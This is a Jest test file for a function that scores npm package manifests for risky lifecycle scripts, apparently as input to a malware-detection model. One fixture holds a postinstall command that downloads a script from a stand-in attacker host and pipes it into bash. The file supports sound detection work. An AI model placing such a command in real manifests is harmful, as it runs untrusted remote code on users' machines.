import { describe, it, expect } from '@jest/globals';
import { behavioralFeaturesFromManifest } from '../../src/lib/behavioralFeatures';
import manifest from '../../../ml-model/feature-keys.json';

describe('behavioralFeaturesFromManifest', () => {
  it('returns zeros for a manifest without scripts', () => {
    const f = behavioralFeaturesFromManifest({ dependencies: { a: '1', b: '2' } });
    expect(f.scriptCount).toBe(0);
    expect(f.hasPostinstall).toBe(0);
    expect(f.dependencyCount).toBe(2);
    expect(f.devDependencyCount).toBe(0);
    expect(f.lifecycleThreatScore).toBe(0);
    expect(f.lifecycleThreatCount).toBe(0);
  });

  it('describes an ordinary build manifest without lifecycle threats', () => {
    const f = behavioralFeaturesFromManifest({
      scripts: { build: 'tsc -p .', test: 'jest', prepare: 'husky' },
      devDependencies: { typescript: '5', jest: '29' },
    });
    expect(f.scriptCount).toBe(3);
    expect(f.hasPostinstall).toBe(0);
    expect(f.devDependencyCount).toBe(2);
    expect(f.lifecycleThreatCount).toBe(0);
  });

  it('scores a postinstall that pipes a download into a shell', () => {
    const f = behavioralFeaturesFromManifest({
      scripts: { postinstall: 'curl -s https://evil.example/x.sh | bash' },
    });
    expect(f.hasPostinstall).toBe(1);
    expect(f.postinstallLength).toBeGreaterThan(0);
    expect(f.networkScriptCount).toBeGreaterThan(0);
    expect(f.lifecycleThreatCount).toBeGreaterThanOrEqual(1);
    expect(f.lifecycleThreatScore).toBeGreaterThanOrEqual(0.75);
  });

  it('ignores non-string script values', () => {
    const f = behavioralFeaturesFromManifest({
      scripts: { postinstall: 42 as unknown as string, test: 'jest' },
    });
    expect(f.scriptCount).toBe(1);
    expect(f.hasPostinstall).toBe(0);
  });

  it('produces every key in the behavioral feature manifest', () => {
    const f = behavioralFeaturesFromManifest({ scripts: { test: 'jest' } }) as unknown as Record<
      string,
      number
    >;
    for (const key of manifest.behavioral) {
      expect(typeof f[key]).toBe('number');
    }
  });
});
